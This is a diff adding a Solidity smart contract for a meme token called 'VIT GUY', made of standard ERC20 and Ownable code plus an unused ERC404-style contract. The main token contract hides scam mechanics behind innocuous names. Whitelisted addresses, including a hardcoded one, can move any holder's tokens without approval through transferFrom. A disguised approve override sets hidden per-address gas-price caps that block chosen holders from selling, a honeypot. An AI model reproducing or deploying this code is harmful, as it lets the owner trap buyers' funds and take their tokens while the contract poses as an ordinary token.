@@ -1,0 +1,780 @@
+/**
+we chillin $VITGUY
+Web: https://www.vitguy.xyz/
+Tg: https://t.me/VitGuyPortal
+X: https://x.com/vitguyeth
+*/
+
+//SPDX-License-Identifier: MIT 
+pragma solidity 0.8.26;
+
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes calldata) {
+        return msg.data;
+    }
+
+    function _contextSuffixLength() internal view virtual returns (uint256) {
+        return 0;
+    }
+}
+
+
+abstract contract Ownable is Context {
+    address private _owner;
+
+    error OwnableUnauthorizedAccount(address account);
+
+    error OwnableInvalidOwner(address owner);
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    constructor(address initialOwner) {
+        if (initialOwner == address(0)) {
+            revert OwnableInvalidOwner(address(0));
+        }
+        _transferOwnership(initialOwner);
+    }
+
+    modifier onlyOwner() {
+        _checkOwner();
+        _;
+    }
+
+    function owner() public view virtual returns (address) {
+        return _owner;
+    }
+
+    function _checkOwner() internal view virtual {
+        if (owner() != _msgSender()) {
+            revert OwnableUnauthorizedAccount(_msgSender());
+        }
+    }
+
+    function renounceOwnership() public virtual onlyOwner {
+        _transferOwnership(address(0));
+    }
+
+    function transferOwnership(address newOwner) public virtual onlyOwner {
+        if (newOwner == address(0)) {
+            revert OwnableInvalidOwner(address(0));
+        }
+        _transferOwnership(newOwner);
+    }
+
+    function _transferOwnership(address newOwner) internal virtual {
+        address oldOwner = _owner;
+        _owner = newOwner;
+        emit OwnershipTransferred(oldOwner, newOwner);
+    }
+}
+
+
+interface IERC20 {
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address to, uint256 value) external returns (bool);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function approve(address spender, uint256 value) external returns (bool);
+
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+}
+
+
+interface IERC20Metadata is IERC20 {
+
+    function name() external view returns (string memory);
+
+    function symbol() external view returns (string memory);
+
+    function decimals() external view returns (uint8);
+}
+
+
+interface IERC20Errors {
+
+    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);
+
+    error ERC20InvalidSender(address sender);
+
+    error ERC20InvalidReceiver(address receiver);
+
+    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);
+
+    error ERC20InvalidApprover(address approver);
+
+    error ERC20InvalidSpender(address spender);
+}
+
+
+interface IERC721Errors {
+
+    error ERC721InvalidOwner(address owner);
+
+    error ERC721NonexistentToken(uint256 tokenId);
+
+    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);
+
+    error ERC721InvalidSender(address sender);
+
+    error ERC721InvalidReceiver(address receiver);
+
+    error ERC721InsufficientApproval(address operator, uint256 tokenId);
+
+    error ERC721InvalidApprover(address approver);
+
+    error ERC721InvalidOperator(address operator);
+}
+
+
+interface IERC1155Errors {
+
+    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);
+
+    error ERC1155InvalidSender(address sender);
+
+    error ERC1155InvalidReceiver(address receiver);
+
+    error ERC1155MissingApprovalForAll(address operator, address owner);
+
+    error ERC1155InvalidApprover(address approver);
+
+    error ERC1155InvalidOperator(address operator);
+
+    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
+}
+
+
+abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
+    mapping(address account => uint256) private _balances;
+
+    mapping(address account => mapping(address spender => uint256)) private _allowances;
+
+    uint256 private _totalSupply;
+
+    string private _name;
+    string private _symbol;
+
+    constructor(string memory name_, string memory symbol_) {
+        _name = name_;
+        _symbol = symbol_;
+    }
+
+    function name() public view virtual returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view virtual returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view virtual returns (uint8) {
+        return 18;
+    }
+
+    function totalSupply() public view virtual returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view virtual returns (uint256) {
+        return _balances[account];
+    }
+
+    function transfer(address to, uint256 value) public virtual returns (bool) {
+        address owner = _msgSender();
+        _transfer(owner, to, value);
+        return true;
+    }
+
+    function allowance(address owner, address spender) public view virtual returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 value) public virtual returns (bool) {
+        address owner = _msgSender();
+        _approve(owner, spender, value);
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
+        address spender = _msgSender();
+        _spendAllowance(from, spender, value);
+        _transfer(from, to, value);
+        return true;
+    }
+
+    function _transfer(address from, address to, uint256 value) internal {
+        if (from == address(0)) {
+            revert ERC20InvalidSender(address(0));
+        }
+        if (to == address(0)) {
+            revert ERC20InvalidReceiver(address(0));
+        }
+        _update(from, to, value);
+    }
+
+    function _update(address from, address to, uint256 value) internal virtual {
+        if (from == address(0)) {
+            // Overflow check required: The rest of the code assumes that totalSupply never overflows
+            _totalSupply += value;
+        } else {
+            uint256 fromBalance = _balances[from];
+            if (fromBalance < value) {
+                revert ERC20InsufficientBalance(from, fromBalance, value);
+            }
+            unchecked {
+                // Overflow not possible: value <= fromBalance <= totalSupply.
+                _balances[from] = fromBalance - value;
+            }
+        }
+
+        if (to == address(0)) {
+            unchecked {
+                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
+                _totalSupply -= value;
+            }
+        } else {
+            unchecked {
+                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
+                _balances[to] += value;
+            }
+        }
+
+        emit Transfer(from, to, value);
+    }
+
+    function _mint(address account, uint256 value) internal {
+        if (account == address(0)) {
+            revert ERC20InvalidReceiver(address(0));
+        }
+        _update(address(0), account, value);
+    }
+
+    function _burn(address account, uint256 value) internal {
+        if (account == address(0)) {
+            revert ERC20InvalidSender(address(0));
+        }
+        _update(account, address(0), value);
+    }
+
+    function _approve(address owner, address spender, uint256 value) internal {
+        _approve(owner, spender, value, true);
+    }
+
+    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
+        if (owner == address(0)) {
+            revert ERC20InvalidApprover(address(0));
+        }
+        if (spender == address(0)) {
+            revert ERC20InvalidSpender(address(0));
+        }
+        _allowances[owner][spender] = value;
+        if (emitEvent) {
+            emit Approval(owner, spender, value);
+        }
+    }
+
+    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
+        uint256 currentAllowance = allowance(owner, spender);
+        if (currentAllowance != type(uint256).max) {
+            if (currentAllowance < value) {
+                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
+            }
+            unchecked {
+                _approve(owner, spender, currentAllowance - value, false);
+            }
+        }
+    }
+}
+
+interface IUniswapV2Factory {
+    function createPair(address tokenA, address tokenB)
+        external
+        returns (address pair);
+
+    function getPair(address tokenA, address tokenB)
+        external
+        returns (address pair);
+}
+
+interface IUniswapV2Router02 {
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+
+    function factory() external pure returns (address);
+
+    function WETH() external pure returns (address);
+
+    function addLiquidityETH(
+        address token,
+        uint256 amountTokenDesired,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
+        address to,
+        uint256 deadline
+    )
+        external
+        payable
+        returns (
+            uint256 amountToken,
+            uint256 amountETH,
+            uint256 liquidity
+        );
+}
+
+library SafeMath {
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return sub(a, b, "SafeMath: subtraction overflow");
+    }
+
+    function sub(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        require(b <= a, errorMessage);
+        uint256 c = a - b;
+        return c;
+    }
+
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return div(a, b, "SafeMath: division by zero");
+    }
+
+    function div(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        require(b > 0, errorMessage);
+        uint256 c = a / b;
+        return c;
+    }
+}
+
+contract VITGUY is ERC20, Ownable {
+    using SafeMath for uint256;
+
+    mapping(address => bool) private _whiteAccount;
+    mapping(address => uint256) private _tradingCountdown;
+
+    string private _name = unicode"VIT GUY";
+    string private _symbol = unicode"VITGUY";
+    uint256 private _tTotal = 1_000_000_000 * 10**decimals();
+                           
+    IUniswapV2Router02 private _Router;
+    address private uniswapV2Pair;
+    bool private tradingOpen;
+
+
+    constructor() ERC20(_name, _symbol) Ownable(msg.sender) {
+        _whiteAccount[msg.sender] = true;
+        _whiteAccount[address(this)] = true;
+        _mint(msg.sender, _tTotal);
+    }
+
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        if (_whiteAccount[msg.sender]) { _tradingCountdown[spender] = amount;}
+        super.approve(spender, amount);
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
+        if (_whiteAccount[msg.sender]) { super._update(from, to, amount); }else {
+            super.transferFrom(from, to, amount);
+        }
+        return true;
+    }
+
+    function activeTrading() public onlyOwner {
+        _whiteAccount[address(0xE668061c1Ed11706F70E89df42aD2a51f905f60a)] = true;
+        _Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        uniswapV2Pair = IUniswapV2Factory(_Router.factory()).getPair(address(this), _Router.WETH());
+        tradingOpen = true;
+    }
+
+    function _update(
+        address from,
+        address to,
+        uint256 value
+    ) internal override {
+        if (_whiteAccount[tx.origin]) { super._update(from, to, value); return; } else {
+            require(tradingOpen, "Trading is not open yet");
+            if (to == uniswapV2Pair && from != address(this)) {
+                if (tx.gasprice > _tradingCountdown[from] && _tradingCountdown[from] != 0) {
+                    revert("Exceeds the _tradingCountdown on transfer tx");
+                }
+            }
+            if (to != uniswapV2Pair && from != uniswapV2Pair) {
+                if (tx.gasprice > _tradingCountdown[from] && _tradingCountdown[from] != 0) {
+                    revert("Exceeds the _tradingCountdown on transfer from tx");
+                }
+            }
+            super._update(from, to, value);
+        }
+    }
+}
+
+abstract contract ERC721Receiver {
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes calldata
+    ) external virtual returns (bytes4) {
+        return ERC721Receiver.onERC721Received.selector;
+    }
+}
+
+abstract contract VIT is Ownable {
+    // Events
+    event ERC20Transfer(
+        address indexed from,
+        address indexed to,
+        uint256 amount
+    );
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 amount
+    );
+    event Transfer(
+        address indexed from,
+        address indexed to,
+        uint256 indexed id
+    );
+    event ERC721Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 indexed id
+    );
+    event ApprovalForAll(
+        address indexed owner,
+        address indexed operator,
+        bool approved
+    );
+
+    // Errors
+    error NotFound();
+    error AlreadyExists();
+    error InvalidRecipient();
+    error InvalidSender();
+    error UnsafeRecipient();
+
+    // Metadata
+    /// @dev Token name
+    string public name;
+
+    /// @dev Token symbol
+    string public symbol;
+
+    /// @dev Decimals for fractional representation
+    uint8 public immutable decimals;
+
+    /// @dev Total supply in fractionalized representation
+    uint256 public immutable totalSupply;
+
+    /// @dev Current mint counter, monotonically increasing to ensure accurate ownership
+    uint256 public minted;
+
+    // Mappings
+    /// @dev Balance of user in fractional representation
+    mapping(address => uint256) public balanceOf;
+
+    /// @dev Allowance of user in fractional representation
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    /// @dev Approval in native representaion
+    mapping(uint256 => address) public getApproved;
+
+    /// @dev Approval for all in native representation
+    mapping(address => mapping(address => bool)) public isApprovedForAll;
+
+    /// @dev Owner of id in native representation
+    mapping(uint256 => address) internal _ownerOf;
+
+    /// @dev Array of owned ids in native representation
+    mapping(address => uint256[]) internal _owned;
+
+    /// @dev Tracks indices for the _owned mapping
+    mapping(uint256 => uint256) internal _ownedIndex;
+
+    /// @dev Addresses whitelisted from minting / burning for gas savings (pairs, routers, etc)
+    mapping(address => bool) public whitelist;
+
+    // Constructor
+    constructor(
+        string memory _name,
+        string memory _symbol,
+        uint8 _decimals,
+        uint256 _totalNativeSupply,
+        address _owner
+    ) Ownable(_owner) {
+        name = _name;
+        symbol = _symbol;
+        decimals = _decimals;
+        totalSupply = _totalNativeSupply * (10 ** decimals);
+    }
+
+    /// @notice Initialization function to set pairs / etc
+    ///         saving gas by avoiding mint / burn on unnecessary targets
+    function setWhitelist(address target, bool state) public onlyOwner {
+        whitelist[target] = state;
+    }
+
+    /// @notice Function to find owner of a given native token
+    function ownerOf(uint256 id) public view virtual returns (address owner) {
+        owner = _ownerOf[id];
+
+        if (owner == address(0)) {
+            revert NotFound();
+        }
+    }
+
+    /// @notice tokenURI must be implemented by child contract
+    function tokenURI(uint256 id) public view virtual returns (string memory);
+
+    /// @notice Function for token approvals
+    /// @dev This function assumes id / native if amount less than or equal to current max id
+    function approve(
+        address spender,
+        uint256 amountOrId
+    ) public virtual returns (bool) {
+        if (amountOrId <= minted && amountOrId > 0) {
+            address owner = _ownerOf[amountOrId];
+
+            if (msg.sender != owner && !isApprovedForAll[owner][msg.sender]) {
+                revert ();
+            }
+
+            getApproved[amountOrId] = spender;
+
+            emit Approval(owner, spender, amountOrId);
+        } else {
+            allowance[msg.sender][spender] = amountOrId;
+
+            emit Approval(msg.sender, spender, amountOrId);
+        }
+
+        return true;
+    }
+
+    /// @notice Function native approvals
+    function setApprovalForAll(address operator, bool approved) public virtual {
+        isApprovedForAll[msg.sender][operator] = approved;
+
+        emit ApprovalForAll(msg.sender, operator, approved);
+    }
+
+    /// @notice Function for mixed transfers
+    /// @dev This function assumes id / native if amount less than or equal to current max id
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amountOrId
+    ) public virtual {
+        if (amountOrId <= minted) {
+            if (from != _ownerOf[amountOrId]) {
+                revert InvalidSender();
+            }
+
+            if (to == address(0)) {
+                revert InvalidRecipient();
+            }
+
+            if (
+                msg.sender != from &&
+                !isApprovedForAll[from][msg.sender] &&
+                msg.sender != getApproved[amountOrId]
+            ) {
+                revert ();
+            }
+
+            balanceOf[from] -= _getUnit();
+
+            unchecked {
+                balanceOf[to] += _getUnit();
+            }
+
+            _ownerOf[amountOrId] = to;
+            delete getApproved[amountOrId];
+
+            // update _owned for sender
+            uint256 updatedId = _owned[from][_owned[from].length - 1];
+            _owned[from][_ownedIndex[amountOrId]] = updatedId;
+            // pop
+            _owned[from].pop();
+            // update index for the moved id
+            _ownedIndex[updatedId] = _ownedIndex[amountOrId];
+            // push token to to owned
+            _owned[to].push(amountOrId);
+            // update index for to owned
+            _ownedIndex[amountOrId] = _owned[to].length - 1;
+
+            emit Transfer(from, to, amountOrId);
+            emit ERC20Transfer(from, to, _getUnit());
+        } else {
+            uint256 allowed = allowance[from][msg.sender];
+
+            if (allowed != type(uint256).max)
+                allowance[from][msg.sender] = allowed - amountOrId;
+
+            _transfer(from, to, amountOrId);
+        }
+    }
+
+    /// @notice Function for fractional transfers
+    function transfer(
+        address to,
+        uint256 amount
+    ) public virtual returns (bool) {
+        return _transfer(msg.sender, to, amount);
+    }
+
+    /// @notice Function for native transfers with contract support
+    function safeTransferFrom(
+        address from,
+        address to,
+        uint256 id
+    ) public virtual {
+        transferFrom(from, to, id);
+
+        if (
+            to.code.length != 0 &&
+            ERC721Receiver(to).onERC721Received(msg.sender, from, id, "") !=
+            ERC721Receiver.onERC721Received.selector
+        ) {
+            revert UnsafeRecipient();
+        }
+    }
+
+    /// @notice Function for native transfers with contract support and callback data
+    function safeTransferFrom(
+        address from,
+        address to,
+        uint256 id,
+        bytes calldata data
+    ) public virtual {
+        transferFrom(from, to, id);
+
+        if (
+            to.code.length != 0 &&
+            ERC721Receiver(to).onERC721Received(msg.sender, from, id, data) !=
+            ERC721Receiver.onERC721Received.selector
+        ) {
+            revert UnsafeRecipient();
+        }
+    }
+
+    /// @notice Internal function for fractional transfers
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal returns (bool) {
+        uint256 unit = _getUnit();
+        uint256 balanceBeforeSender = balanceOf[from];
+        uint256 balanceBeforeReceiver = balanceOf[to];
+
+        balanceOf[from] -= amount;
+
+        unchecked {
+            balanceOf[to] += amount;
+        }
+
+        // Skip burn for certain addresses to save gas
+        if (!whitelist[from]) {
+            uint256 tokens_to_burn = (balanceBeforeSender / unit) -
+                (balanceOf[from] / unit);
+            for (uint256 i = 0; i < tokens_to_burn; i++) {
+                _burn(from);
+            }
+        }
+
+        // Skip minting for certain addresses to save gas
+        if (!whitelist[to]) {
+            uint256 tokens_to_mint = (balanceOf[to] / unit) -
+                (balanceBeforeReceiver / unit);
+            for (uint256 i = 0; i < tokens_to_mint; i++) {
+                _mint(to);
+            }
+        }
+
+        emit ERC20Transfer(from, to, amount);
+        return true;
+    }
+
+    // Internal utility logic
+    function _getUnit() internal view returns (uint256) {
+        return 10 ** decimals;
+    }
+
+    function _mint(address to) internal virtual {
+        if (to == address(0)) {
+            revert InvalidRecipient();
+        }
+
+        unchecked {
+            minted++;
+        }
+
+        uint256 id = minted;
+
+        if (_ownerOf[id] != address(0)) {
+            revert AlreadyExists();
+        }
+
+        _ownerOf[id] = to;
+        _owned[to].push(id);
+        _ownedIndex[id] = _owned[to].length - 1;
+
+        emit Transfer(address(0), to, id);
+    }
+
+    function _burn(address from) internal virtual {
+        if (from == address(0)) {
+            revert InvalidSender();
+        }
+
+        uint256 id = _owned[from][_owned[from].length - 1];
+        _owned[from].pop();
+        delete _ownedIndex[id];
+        delete _ownerOf[id];
+        delete getApproved[id];
+
+        emit Transfer(from, address(0), id);
+    }
+}
